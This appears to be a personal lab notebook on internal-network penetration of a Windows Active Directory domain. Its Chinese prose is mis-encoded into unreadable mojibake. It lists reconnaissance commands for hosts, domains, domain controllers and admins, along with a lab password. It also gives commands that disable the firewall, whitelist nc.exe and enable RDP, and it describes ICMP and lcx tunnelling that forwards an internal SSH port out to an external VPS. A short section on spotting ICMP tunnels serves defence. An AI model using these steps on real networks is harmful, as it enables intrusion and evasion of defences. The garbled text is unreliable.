# é…ç½®
å®‰è£…ADæ—¶ï¼Œé»˜è®¤çš„æ•°æ®åº“è·¯å¾„ï¼š

![image-20210111163939501](../image/ad-1.png)

ç™»å½•å£ä»¤ï¼šHacker.testlab

![image-20210117171806272](../image/ad-2.png)



win7 192.168.1.3

test/P@ssword1



** ä½¿ç”¨wmicæŒ‡ä»¤æ²¡æœ‰æ—¥å¿—ï¼Ÿnet localgroup administratorsä¹Ÿæ²¡æœ‰æ—¥å¿—ï¼Ÿ



```
C:/Users/Foe0>systeminfo |findstr /B /C:"OS Name" /C:"OS Version"

C:/Users/Foe0>systeminfo |findstr /B /C:"OS åç§°" /C:"OS ç‰ˆæœ¬"
OS åç§°:          Microsoft Windows 7 ä¼ä¸šç‰ˆ
OS ç‰ˆæœ¬:          6.1.7600 æš‚ç¼º Build 7600



æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ä¿¡æ¯ã€‚

C:/Users/Foe0>wmic product get name,version
No Instance(s) Available.

C:/Users/Foe0>powershell "Get-WmiObject -class Win32_Product |Select-Object -Pro
perty name,version"
æ— æ³•å°†â€œGet-WimObjectâ€é¡¹è¯†åˆ«ä¸º cmdletã€å‡½æ•°ã€è„šæœ¬æ–‡ä»¶æˆ–å¯è¿è¡Œç¨‹åºçš„åç§°ã€‚è¯·æ£€
æŸ¥åç§°çš„æ‹¼å†™ï¼Œå¦‚æœåŒ…æ‹¬è·¯å¾„ï¼Œè¯·ç¡®ä¿è·¯å¾„æ­£ç¡®ï¼Œç„¶åé‡è¯•ã€‚
æ‰€åœ¨ä½ç½® è¡Œ:1 å­—ç¬¦: 14
```

```
æŸ¥çœ‹æœ¬çº§æœåŠ¡ä¿¡æ¯ï¼šwmic service list brief

æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼štasklist/wmic process list brief

æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯ï¼šwmic startup get command,caption

æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼šschtasks /query /fo LIST /v

æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´ï¼šnet statistics workstation

æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨ï¼šnet user   ----å¯å°è¯•æ‰¾å‡ºå†…å¾€ä¸»æœºå‘½ä»¤è§„åˆ™ã€‚

æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·ï¼šquery user|| qwinsta

æŸ¥çœ‹ä¼šè¯ï¼šnet session

æŸ¥çœ‹ç«¯å£åˆ—è¡¨ï¼šnetstat -ano

æŸ¥çœ‹è¡¥ä¸åˆ—è¡¨ï¼šsysteminfo

wmicå‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿè¡¥ä¸ï¼šwmic qfe get Caption,Description,HotFixID,InstalledOn

æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨ï¼šnet share 
wmic share get name,path,status

æŸ¥è¯¢è·¯ç”±å™¨åŠå¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨route print
arp -a
```



### 14.æŸ¥è¯¢é˜²ç«å¢™ç›¸å…³é…ç½®ï¼š
#### 14.1 å…³é—­é˜²ç«å¢™

```
server2003å‰ï¼šnetsh firewall set opmode disable 
2003ä¹‹åï¼šnetsh advfirewall set allprofiles state off
```

#### 14.2 æŸ¥çœ‹é…ç½®

netsh firewall show config

#### 14.3 ä¿®æ”¹é…ç½®

```
å…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥ï¼šï¼ˆserver2003å‰ï¼‰ï¼š

netsh firewall add allowdprogram c:/nc.exe "allow nc" enable

netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program=â€œc:/nc.exeâ€

å…è®¸æŒ‡å®šç¨‹åºé€€å‡º
netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="c:/nc.exe"

å…è®¸3389ç«¯å£æ”¾è¡Œ
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow


```

### 15 æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ
```

reg query "HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Internet Settings"
```

![image-20210117160953146](../image/reg.png)

### 16 æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡

#### 16.1 æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£

```
æ‰§è¡Œæ³¨å†Œè¡¨æŸ¥è¯¢è¯­å¥ï¼Œè¿æ¥çš„ç«¯å£ä¸º0xd3dï¼Œå³3389
REG QUERY "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/TerminalServer/WinStations/RDP-Tcp" /V PortNumber
```

#### 16.3 å¼€å¯3389ç«¯å£

```
winserser2003:
wmic path win32_terminalservicesetting where (_CLASS !="") call setallowtsconnections 1

winserver2008/winserver2012
wmic /namespace://root/cimv2/terminalservices path win32_terminalservicesetting where (_CLASS !="") call setallowsconnections 1

wmic /namespace://root/cimv2/terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1

reg add "HKLM/SYSTEM/CURRENT/CONTROLSET/CONTROL/TERMINAL SERVER" /vfSingleSessionPerUser /t REG_DWORD /d 0 /f
    
```

## 2.2 è‡ªåŠ¨æ”¶é›†ä¿¡æ¯

 é€šå¸¸ä¼šæŸ¥è¯¢çš„ä¸€äº›ä¿¡æ¯ï¼šæœåŠ¡ã€ç”¨æˆ·è´¦å·ã€ç”¨æˆ·ç»„ã€ç½‘ç»œæ¥å£ã€ç¡¬ç›˜ä¿¡æ¯ã€ç½‘ç»œæ­å–œä¿¡æ¯ã€æ“ä½œç³»ç»Ÿã€å®‰è£…è¡¥ä¸ã€å®‰è£…çš„è½¯ä»¶ã€å¯åŠ¨æ—¶è¿è¡Œçš„ç¨‹åºã€æ—¶åŒºç­‰ç­‰ã€‚

### 1  wmic

ï¼ˆwindows managerment instrumentation command-lineï¼Œwindowsç®¡ç†å·¥å…·å‘½ä»¤è¡Œï¼‰ï¼Œä¸‹è½½åœ°å€ï¼šhttp://www.fuzzysecurity.com/scripts/files/wmic_info.rar

ä½¿ç”¨åç”Ÿæˆhtmlæ–‡ä»¶ã€‚

# [å®éªŒ1ä¼Šå‘€å‘€å‘€](http://www.fuzzysecurity.com/scripts/files/wmic_info.rar)

### 2 Empire

how to use?åæ¸—é€éƒ¨åˆ†ï¼Ÿå¥½åƒæ˜¯å•Š

æŸä¸ªæ¨¡å—ï¼Œç®¡ç†å‘˜æƒé™ã€‚



## 2.3 æŸ¥çœ‹å½“å‰æƒé™
```
whoami
å¯èƒ½å‡ºç°çš„æƒ…å†µï¼š
1.æœ¬åœ°æ™®é€šç”¨æˆ· hostname/username
2.æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ· hostname/administrator
3.åŸŸå†…ç”¨æˆ· domain/username

è·å–åŸŸSID 
whoami /all
```

![image-20210117172526177](../image/sid.png)

```
net user test /domain æŸ¥çœ‹ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ã€‚
```

![image-20210117172831945](../image/sid-1.png)

![image-20210117173133358](../image/sid-2.png)

## 2.4 åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ

#### 2.4.1 ipconfig

```
ipconfig /all 
åŸŸååæŸ¥ç¡®å®šDNSçš„IPåœ°å€
nslookup
```

![image-20210117173502372](../image/ipconfig.png)

#### 2.4.2 systeminfoä¸­çš„åŸŸå­—æ®µ

å¦‚æœä¸ºworkgroupï¼Œåˆ™è¯´æ˜æ²¡æœ‰åŸŸç¯å¢ƒã€‚

![image-20210117174844576](../image/systeminfo.png)

![image-20210117175014048](../image/systeminfo1.png)

#### 2.4.3 æŸ¥çœ‹å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯

```
net config workstationï¼Œå…¶ç°è±¡åŒsysteminfoç±»ä¼¼ã€‚
```

![image-20210117175222201](../image/netconfig.png)

#### 2.4 4 åˆ¤æ–­ä¸»åŸŸ 

```
net time /domain
```

å¦‚ä¸‹æ˜¾ç¤º

1.å³æ˜¯å­˜åœ¨åŸŸä¸”æ˜¯åŸŸç”¨æˆ·

![image-20210117175744528](../image/nettime.png)

2.å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·

3.æœªåŠ å…¥åŸŸç¯å¢ƒ

![image-20210117175906002](../image/nettime2.png)

## 2.5 æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº
#### 2.5.1 NETBIOS
NETBIOSæ˜¯å±€åŸŸç½‘ç¨‹åºæ‰€ä½¿ç”¨çš„çš„ä¸€å¥—APIï¼ˆåº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼‰ï¼Œä¸ºç¨‹åºæä¾›äº†è¯·æ±‚ä½çº§åˆ«æœåŠ¡çš„ç»Ÿè®¡å‘½ä»¤é›†ï¼›ä¸ºå±€åŸŸç½‘æä¾›äº†ç½‘ç»œåŠå…¶ä»–ç‰¹æ®ŠåŠŸèƒ½ã€‚
netbiosä¹Ÿæ˜¯è®¡ç®—æœºçš„æ ‡è¯†åï¼ˆï¼Ÿä¸»æœºåï¼Ÿï¼‰ã€‚ç”¨äºå±€åŸŸç½‘ä¸­è®¡ç®—æœºçš„äº’è®¿ã€‚å…¶å·¥ä½œæµç¨‹å°±æ˜¯æ­£å¸¸çš„æœºå™¨åè§£ææŸ¥è¯¢åº”ç­”è¿‡ç¨‹ã€‚
nbtscanå·¥å…·



## 2.7 æ”¶é›†åŸŸå†…ä¿¡æ¯

### 2.7.1 æŸ¥è¯¢åŸŸ

ï¼Ÿï¼Ÿï¼Ÿéœ€è¦ä½¿ç”¨systemæƒé™è¿è¡Œæ­¤å‘½ä»¤ã€‚æœºå™¨ç”¨æˆ·ï¼Œæœºå™¨å$

ä¿®æ”¹ç»„ç­–ç•¥ä¸­çš„æœåŠ¡ï¼Œå¯åŠ¨computer browseræœåŠ¡ã€‚![image-20210123173210268](../image/config1)

![image-20210123165020524](../image/netview-domain.png)

![image-20210123170913478](../image/netview-domain1.png)

```
net view /domain æŸ¥è¯¢åŸŸ
net view /domain:hacker æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ä¸»æœº
net group /domain æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„åˆ—è¡¨
net group â€œdomain conputersâ€ /domain æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨
net accounts /domain æŸ¥çœ‹åŸŸå†…å¯†ç è®¾ç½®æƒ…å†µ

nltest /domain_trusts è·å–åŸŸä¿¡ä»»ä¿¡æ¯ã€‚
```

![image-20210123171631891](../image/nltest.png)

## 2.8 æŸ¥æ‰¾åŸŸæ§

```
nltest /DCLIST:hacker æŸ¥çœ‹åŸŸæ§ä¸»æœºå
nslookup -type=SRV _ldap._tcp 
net time /domain æŸ¥çœ‹æ—¶é—´æœåŠ¡å™¨
net group â€œdomain controllersâ€ /domain æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„
netdom query pdc
```

![image-20210123173800174](../image/dc.png)

![image-20210123174126223](../image/dc1.png)



![image-20210123174308765](../image/dc2.png)

## 2.9 æŸ¥è¯¢åŸŸå†…ç”¨æˆ·åŠç®¡ç†å‘˜

```
net user /domain
wmic useraccount get /all 
dsquery user æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·
net localgroup administrators æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·

æŸ¥è¯¢åŸŸç®¡ç†å‘˜ net group â€œdomain adminsâ€ /domain

net group "enterprise admins" /domain æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„
```

![image-20210123175846099](C:/Users/Foe0/AppData/Roaming/Typora/typora-user-images/image-20210123175846099.png)

krbtgt å¯ä»¥åˆ›å»ºç¥¨æ®æˆæƒæœåŠ¡TGSçš„åŠ å¯†å¯†é’¥ï¼›è¿˜å¯å®ç°å¤šç§åŸŸå†…æƒé™æŒä¹…åŒ–æ–¹æ³•ã€‚

# ç¬¬3ç«  éšè—é€šä¿¡éš§é“æŠ€æœ¯

è¿™é‡Œçš„éš§é“æŒ‡çš„æ˜¯ï¼Œç»•è¿‡ç«¯å£å±è”½çš„ä¸€ç§é€šä¿¡æ–¹å¼ï¼Œé˜²ç«å¢™ä¸¤ç«¯çš„æ•°æ®åŒ…é€šè¿‡é˜²ç«å¢™æ‰€å…è®¸çš„æ•°æ®åŒ…ç±»å‹ï¼Œæˆ–è€…ç«¯å£è¿›è¡Œå°è£…ï¼Œä¸å¯¹æ–¹é€šä¿¡ã€‚å½“æ•°æ®åŒ…åˆ°è¾¾ç›®çš„åœ°æ—¶ï¼Œå°†æ•°æ®åŒ…è¿˜åŸï¼Œå†å°†è¿˜åŸåçš„æ•°æ®åŒ…å‘é€åˆ°ç›¸åº”çš„æœåŠ¡å™¨ä¸Šã€‚

å¸¸è§éš§é“ä¸¾ä¾‹ï¼š

ç½‘ç»œå±‚ï¼šipv6ï¼ŒICMPï¼ŒGREéš§é“ã€‚

ä¼ è¾“å±‚ï¼štcpéš§é“ï¼Œudpéš§é“ï¼Œå¸¸è§„ç«¯å£è½¬å‘ã€‚

åº”ç”¨å±‚ï¼šsshéš§é“ï¼ŒHTTPéš§é“ï¼ŒHTTPSéš§é“ï¼ŒDNSéš§é“ã€‚

## 3.1 åº”ç”¨å±‚ï¼š

### 3.1.1 ä½¿ç”¨dnsåè®®åˆ¤æ–­ç½‘ç»œè¿é€šæ€§

DNSåè®®æ˜¯è¿é€šçš„ï¼Ÿ

```bash
Windowsï¼šnslookup domain vps
```

![image-20210126101638592](../image/image-20210126101638592.png)

![image-20210126084300124](../image/image-20210126084300124.png)



```bash
dig @vps domain
```

![image-20210126101937658](../image/image-20210126101937658.png)

æœ¨æœ‰å¼€å¯53ç«¯å£![image-20210126103957576](../image/image-20210126103957576.png)

## 3.2 ç½‘ç»œå±‚éš§é“æŠ€æœ¯

IPv6ï¼ŒICMPéš§é“ï¼ŒGREéš§é“ã€‚ 

### 3.2.1 IPv6éš§é“

IPv6æ˜¯é’ˆå¯¹äºæŸäº›ä¸èƒ½è§£æIPv6åœ°å€ç±»å‹çš„å®‰å…¨è®¾å¤‡ã€‚socatï¼Œ6tunnelï¼Œnt6tunnelã€‚

### 3.2.2 ICMPéš§é“

1.icmpshï¼ˆè·‘ä¸èµ·æ¥ï¼‰linux-windows

2.[pingtunnel](http://freshmeat.sourceforge.net/urls/f7770b6af3089face1ee4890eac8cee1) linux-linux/windows 

http://www.cs.uit.no/~daniels/PingTunnel/#download

 psï¼šlinuxéœ€è¦å…ˆä¸‹è½½[libpcap](http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz)åŒ…ï¼Œwinéœ€è¦å…ˆä¸‹è½½wincapã€‚

å®éªŒè®°å½•ï¼š

å—å®³ä¸»æœºæ‰§è¡Œï¼šptunnel -x shuteer

![image-20210131164821137](../image/image-20210131164821137.png)

vpsæ‰§è¡Œï¼šptunnel -p 192.168.137.129 -lp 1080 -da 192.168.137.128 -dp 22 -x shuteer

![image-20210131164632829](../image/image-20210131164632829.png)

![å°è¯•è¿æ¥å‘ç°æ˜¯å¯ä»¥ä½¿ç”¨sshè¿æ¥çš„ï¼Œè¯´æ˜ç«¯å£æ˜¯è¿é€šäº†](E:\1.å­¦ä¹ æ–‡æ¡£\4-Windows\image\image-20210131164958178.png)å°è¯•è¿æ¥å‘ç°æ˜¯å¯ä»¥ä½¿ç”¨sshè¿æ¥çš„ï¼Œè¯´æ˜ç«¯å£æ˜¯è¿é€šäº†

![image-20210131165152218](../image/image-20210131165152218.png)ä½†æ˜¯æ— æ³•è¿æ¥æˆåŠŸï¼ŒğŸ˜£ã€‚

å¤šæ¬¡åå¤æµ‹è¯•å¹¶æŠ“åŒ…æŸ¥çœ‹ï¼Œä½¿ç”¨3306ç«¯å£æ—¶ä¹Ÿä¸æˆåŠŸï¼Œæ•°æ®åŒ…ä¸­æ²¡æœ‰ç›¸å…³ä¿¡æ¯ï¼ŒÎµ=(Â´Î¿ï½€*)))å”‰ï¼Œå…ˆè¿™æ ·å§ã€‚

### 3.2.3 é˜²å¾¡ICMPçš„æ–¹æ³•

ICMPéš§é“çš„ç‰¹å¾ï¼šåŒä¸€æ¥æºçš„ICMPæ•°æ®åŒ…çš„æ•°é‡ï¼Œéš§é“ä¸æ™®é€šçš„ç›¸æ¯”ï¼Œæ•°é‡ç‰¹åˆ«å¤§ã€‚

payloadå¤§äº64bitçš„ICMPæ•°æ®åŒ…ã€‚

çœ‹æ•°æ®åŒ…çš„å“åº”ä½“ä¸è¯·æ±‚åŒ…çš„payloadæ˜¯å¦å¯¹åº”ã€‚

æ£€æŸ¥åè®®æ ‡ç­¾ï¼ŒæŸäº›å·¥å…·ä¼šæœ‰ç‰¹æ®Šæ ‡è¯†ï¼Œå¦‚icmptunnelçš„TUNLã€‚

## 3.3 ä¼ è¾“å±‚

ä¼ è¾“å±‚ï¼štcpéš§é“ï¼Œudpéš§é“ï¼Œå¸¸è§„ç«¯å£è½¬å‘ã€‚

### 3.3.1 lcxï¼ˆåå¼¹shellï¼Œç­‰å¾…å—å®³ä¸»æœºä¸»åŠ¨è¿å›ï¼‰

åŸºäºsocketå¥—æ¥å­—å®ç°çš„ç«¯å£è½¬å‘å·¥å…·ã€‚

https://blog.csdn.net/wyvbboy/article/details/61921773

https://www.jb51.net/hack/575755.html

1.å†…ç½‘ç«¯å£è½¬å‘

```
å®éªŒï¼š
ç¯å¢ƒ
å†…ç½‘æŸä¸»æœºï¼ˆvmware-kaliï¼‰
å¤–ç½‘vpsï¼š139.155.2.117
å‡†å¤‡å·¥å…·http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip
vpsé¦–å…ˆå¼€å¯ç›‘å¬ï¼š
./portmap -m 2 -p1 6666 -h2 139.155.2.117 -p2 7777

å†…ç½‘ä¸»æœºè½¬å‘22ç«¯å£åˆ°vpsçš„6666ç«¯å£ä¸Š
./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 139.155.2.117 -p2 6666

ç„¶ååœ¨vpsä¸Šè¿æ¥ssh 127.0.0.1 -p 7777 æˆ–è€…ssh vps -p 7777

```

æŸ¥çœ‹æµé‡åŒ…ï¼Œå‘ç°ï¼Œçœ‹ä¸å‡ºç‰¹å¾ï¼æœ‰ä¸ªgNbå­—æ®µä¸€ç›´å‡ºç°ï¼Œä½†åº”è¯¥ä¸æ˜¯ã€‚ã€‚ã€‚

2.æœ¬åœ°ç«¯å£æ˜ å°„ï¼šå°†3389ç­‰è½¬åˆ°53ç­‰å¯å‘å¤–è®¿é—®çš„ç«¯å£ä¸Šã€‚

lcx.exe -tran 53 192.168.137.158 3389ï¼Œå°†è¯¥ä¸»æœºçš„3389 æ˜ å°„åˆ°53ç«¯å£ä¸Šã€‚

å‡è®¾æˆ‘çš„å—å®³ä¸»æœºwin10çš„3389ä¸èƒ½è¢«å¤–è®¿é—®ï¼Œå³ä¸å…è®¸ä»å¤–éƒ¨æ¥è®¿é—®3389ç«¯å£ï¼Œä½†æ˜¯53ï¼Œæˆ–è€…å…¶ä»–å¸¸è§çš„ä¸å…¬ç½‘äº¤äº’çš„æˆ–è€…æ²¡æœ‰åœ¨é˜²ç«å¢™é»‘åå•ä¸­çš„ï¼Œéƒ½å¯ä»¥å°è¯•åšç«¯å£æ˜ å°„ï¼Œæ³¨æ„æ­¤å¤„ä¸å…è®¸å¤ç”¨ç«¯å£ã€‚

![image-20210208212501355](../image/image-20210208212501355.png)

### 3.3.2 netcat